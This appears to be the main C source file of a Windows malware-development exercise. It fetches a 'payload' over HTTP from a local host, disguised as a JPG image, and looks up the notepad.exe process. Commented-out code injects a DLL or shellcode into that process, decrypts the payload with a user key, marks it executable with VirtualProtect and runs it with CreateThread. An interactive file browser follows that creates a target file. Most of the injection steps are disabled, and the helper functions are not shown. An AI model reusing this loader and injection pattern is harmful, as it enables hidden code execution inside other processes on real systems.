#include "main.h"

int main()
{
	SIZE_T sPayload = 0;
	PBYTE pPayload;
	if (!FetchPayloadHttpDynamic(L"http://127.0.0.1:8000/Resources/Test1.jpg", &pPayload, &sPayload)) printf("[x] Failed :(\n");
	else printf("[!] Success\n");
	DWORD dwProcessId;
	LPTEXT pText_t;
	HANDLE hProcess;
	if ((hProcess = FetchProcess(L"notepad.exe", &dwProcessId)) == INVALID_HANDLE_VALUE) { printf("Couldn't Find it:(\n"); }
	//if (!InjectDll(hProcess, L"C:\\Users\\mikmu\\Desktop\\DLL.dll")) return -2;
	
	call();
	
	//if (!(pText_t = Test())) return -5;
	
	//if (!InjectShellcode(hProcess, (PBYTE)pText_t->pText, pText_t->sText)) return -6;

	/*
	unsigned char *pK[256] = {'\0'};

	printf("[!] Enter Your Key Please:\n");
	
	fgets(pK, 255, stdin);

	unsigned char *pDecryptedPayload = malloc(pText_t->sText);

	Context context_t;

	//printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pText_t->pText, pText_t->pText);
	*/	
	
	//DWORD dwOldRights;

	//if (!VirtualProtect(pText_t->pText, pText_t->sText, PAGE_EXECUTE_READ, &dwOldRights)) return -2;

	//DWORD dwThreadPid;

	//HANDLE hThread = CreateThread(NULL, 0, pText_t->pText, NULL, 0, &dwThreadPid);
	
	WCHAR pPath[MAX_PATH] = { L'\0' };

	FetchDrives(pPath);
	
	if (!pPath[0]) {printf("[X] Failed To Fetch Drives!\n[X] Exiting With Error Code: %x\n", GetLastError()); return -1;}
	
	PrintDrives(pPath);
	
	while (!UserInputDrives(pPath)) { printf("[X] Wrong Input!\n"); PrintDrives(pPath);}
	
	PrintCWD(pPath);
	
	WIN32_FIND_DATA_ARRAYW *pFiles_arr_t = FetchFileArrayW(pPath);
	
	if (pFiles_arr_t == NULL) 
	{
		printf("[X] Fetching Folders Failed\nError Code:0x%.8x\n", GetLastError());
		return -2;
	}
	
	PrintFilesArrayW(pFiles_arr_t);
	
	UserInputFolders(pPath, pFiles_arr_t);
	
	while (!UserInputContinueFolders()) {
		
		if (pFiles_arr_t == NULL) {
			printf("[!] No Files Under Current Folder.\n");
			break;
		}
		FreeFileArray(pFiles_arr_t);
		
		pFiles_arr_t = FetchFileArrayW(pPath);

		PrintCWD(pPath);

		PrintFilesArrayW(pFiles_arr_t);
		
		UserInputFolders(pPath, pFiles_arr_t);
	}
 	
	PrintCWD(pPath);
	wprintf(L"File Name: %s", pFiles_arr_t->pFilesNames_arr->pFileName);

	
	if(pFiles_arr_t != NULL)FreeFileArray(pFiles_arr_t);
	HANDLE hFile = INVALID_HANDLE_VALUE;
/*
 * GENERIC_READ = 0x80000000
 * GENERIC_WRITE = 0x40000000. (0d1073741824).
 * GENERIC_READ | GENERIC_WRITE = 0xC0000000. (0d3221225472).
 */
	
	hFile = CreateFileW(
		pPath,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ,//(0d1).
		NULL, //(0d0).
		CREATE_ALWAYS, //(0d2).
		FILE_ATTRIBUTE_NORMAL,//(0x80 || 0d128).
		NULL 
	);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		printf("[X] Failed To Fetch File Handle!\n[X] Exiting With Error Code: %x\n", GetLastError());
		return -4;
	}

	CloseHandle(hFile);
	printf("[#] Payload Created Successfully! :)\n");
	printf("[#] Press 'Enter' To Exit! :)");
	return 0;
}

